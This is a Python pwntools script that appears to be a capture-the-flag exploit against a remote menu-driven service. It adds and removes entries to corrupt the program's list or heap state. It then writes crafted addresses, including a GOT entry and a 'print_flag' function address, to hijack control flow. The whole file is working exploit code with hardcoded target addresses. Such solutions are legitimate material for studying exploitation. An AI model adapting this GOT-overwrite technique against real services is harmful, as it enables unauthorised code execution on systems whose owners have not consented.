from pwn import *
import time 
import sys
import struct

s = remote(sys.argv[1], int(sys.argv[2]))
print s.recvuntil('> ')

# add n items
n = int(sys.argv[3])
s.sendline('add')
print s.recvline(),
print s.recvline(),

for i in xrange(n):
	s.sendline('aaa')
	print s.recvline(),
	print s.recvline(),
s.sendline('')
print s.recvuntil('> ')

# remove stage
s.sendline('remove')
print s.recvline(),
print s.recvline(),
s.sendline('%d' % (n - 2))
s.sendline('%d' % (n - 3))
s.sendline('')
print s.recvuntil('> ')

time.sleep(2)

# add
s.sendline('add')
print s.recvline(),
print s.recvline(),
task_data = 0x0804a780
s.send(struct.pack('<I', task_data) + 'AAA\n')
print s.recvline(),
print s.recvline(),
s.sendline('')
print s.recvuntil('> ')

time.sleep(2)

# add again 
s.sendline('add')
print s.recvline(),
print s.recvline(),
print_got = 0x0804a6d0
s.sendline('AAAA' + struct.pack('<I', print_got) + 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
print s.recvline(),
print s.recvline(),
s.sendline('')
print s.recvuntil('> ')

# update
s.sendline('update')
print s.recvline(),
print s.recvline(),
print_flag = 0x0804883b
s.sendline(('%d;' % (n-1)) + struct.pack('<I', print_flag))

print s.recv(1024)
print s.recv(1024)
print s.recv(1024)
print s.recv(1024)
